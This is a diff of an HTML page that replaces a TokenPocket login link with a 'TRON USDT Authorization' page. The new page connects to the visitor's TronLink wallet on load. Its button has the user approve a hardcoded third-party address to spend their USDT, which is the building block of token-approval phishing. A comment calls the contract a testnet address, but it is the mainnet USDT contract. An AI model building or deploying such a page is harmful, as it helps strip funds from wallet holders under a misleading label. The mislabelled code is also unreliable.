@@ -3,38 +3,65 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TokenPocket Integration</title>
+  <title>TRON USDT Authorization</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.9.0/dist/TronWeb.js"></script>
 </head>
 <body>
-  <h1>TokenPocket Login Integration</h1>
+  <h1>TRON USDT Authorization</h1>
 
-  <!-- 点击此链接可以跳转到 TokenPocket -->
-  <a href="" id="tp-link">点击这里使用 TokenPocket 登录</a>
+  <button id="authorizeButton" disabled>Authorize USDT</button>
 
   <script>
-    // 定义 JSON 对象
-    const tpData = {
-      "callbackUrl": "https://www.pihksale.finance/12s/tp",
-      "action": "login",
-      "actionId": "1648522106711",
-      "blockchain": "tron",
-      "dappIcon": "https://eosknights.io/img/icon.png",
-      "dappName": "zs",
-      "protocol": "TokenPocket",
-      "version": "2.0"
-    };
+    // USDT 合约地址 (Shasta 测试网)
+    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 测试网USDT
+    const spenderAddress = 'THbVQp8kMjStKNnf2iCY6NEzThKMK5aBHg'; // 授权接收地址
+    const amountToAuthorize = '1000000'; // 授权的USDT数量（1 USDT，单位是最小单位）
 
-    // 将 JSON 对象转换为 URL 编码的字符串
-    const tpParams = encodeURIComponent(JSON.stringify(tpData));
+    async function connectWallet() {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        console.log('钱包已连接:', window.tronWeb.defaultAddress.base58);
+        document.getElementById('authorizeButton').disabled = false;
+      } else if (window.tronLink) {
+        try {
+          // 请求连接 TronLink
+          await window.tronLink.request({ method: 'tron_requestAccounts' });
+          console.log('钱包连接成功:', window.tronWeb.defaultAddress.base58);
+          document.getElementById('authorizeButton').disabled = false;
+        } catch (error) {
+          console.error('用户拒绝连接钱包');
+        }
+      } else {
+        alert('请安装 TronLink 钱包扩展');
+      }
+    }
 
-    // 构造 TokenPocket URL
-    const tpUrl = `tpoutside://pull.activity?param=${tpParams}`;
+    async function authorizeUSDT() {
+      try {
+        // 获取当前钱包地址
+        const userAddress = window.tronWeb.defaultAddress.base58;
+        console.log('用户地址:', userAddress);
 
-    // 设置超链接的 href 属性
-    document.getElementById('tp-link').href = tpUrl;
+        // 使用 tronWeb 访问 USDT 合约
+        const contract = await window.tronWeb.contract().at(usdtContractAddress);
 
-    // 调试：在控制台显示生成的 URL
-    console.log('TokenPocket URL:', tpUrl);
+        // 授权指定地址可以使用指定数量的 USDT
+        const result = await contract.approve(spenderAddress, amountToAuthorize).send({ from: userAddress });
+        if (result) {
+          console.log('授权成功:', result);
+          alert('USDT 授权成功');
+        } else {
+          console.log('授权失败');
+        }
+      } catch (error) {
+        console.error('授权时发生错误:', error);
+      }
+    }
+
+    // 页面加载时自动连接钱包
+    window.onload = connectWallet;
+
+    // 点击按钮时执行 USDT 授权
+    document.getElementById('authorizeButton').addEventListener('click', authorizeUSDT);
   </script>
 </body>
 </html>
